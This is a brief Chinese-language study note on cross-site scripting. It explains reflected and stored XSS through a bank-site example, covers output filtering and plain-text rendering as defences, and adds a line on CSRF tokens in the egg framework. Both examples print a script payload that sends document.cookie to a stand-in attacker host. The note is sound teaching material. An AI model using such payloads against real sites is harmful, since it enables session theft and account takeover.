# xss

## 反射型

非持久化，每次触发都需要用户去点击（url）。

页面直接输出用户输入的内容（url上的内容），如果用户输入js脚本，页面会输出执行该js脚本。

案例：

1. 一个正规的网站（银行网站`www.yinhang.com`）存在反射型xss。
2. 黑客利用这个漏洞，并调整url参数，使得访问该网址时执行一个js脚本：` www.yinhang.com?name=<script>window.open('http://www.heike.com?cookie='+document.cookie)</script>`。
3. 自己编写一个网站`www.heike.com`，用于接收js脚本发起的请求来获取cookie
4. 拿到cookie，利用该cookie，伪装自身进行一系列非法操作。

黑客的网址接收到这个cookie，即可通过这个cookie来访问银行网址。做出非法的操作。

## 解决

因此，所有的用户输入的内容在输出时，都必须进行过滤。或者将其作为一个纯文本执行，而非html代码执行。

## 存储型

持久化，将用户录入的信息存储在库中。

案例：

1. 一个正规的网站（银行网站`www.yinhang.com`）存在存储型xss。
2. 黑客利用这个漏洞，提前往数据库录入一个脚本内容，使得访问该网址时，会执行这段js脚本（`<script>window.open('http://www.heike.com?cookie='+document.cookie)</script>`）。
3. 自己编写一个网站`www.heike.com`，用于接收js脚本发起的请求来获取cookie。
4. 拿到cookie，利用该cookie，伪装自身进行一系列非法操作。

## 解决

因此，所有的用户输入的内容在输出时，都必须进行过滤。或者将其作为一个纯文本执行，而非html代码执行。

## 总结

xss简单的说就是用户的注入，然后显示（存储后显示给其他，直接显示）出来。如果显示的时候过滤了，那不就行了。

1. 如果是富文本编辑，那么必然存在标签，不能过滤，只能在将这个内容显示时，用纯文本显示，而非html文本显示。
2. 如果是有严格要求，则禁止录入任何标签，或者直接过滤掉标签。

# csrf

egg的csrf可以修改它的变量名，而且默认会在cookie上放csrfToken，可以配置去掉。具体看官网。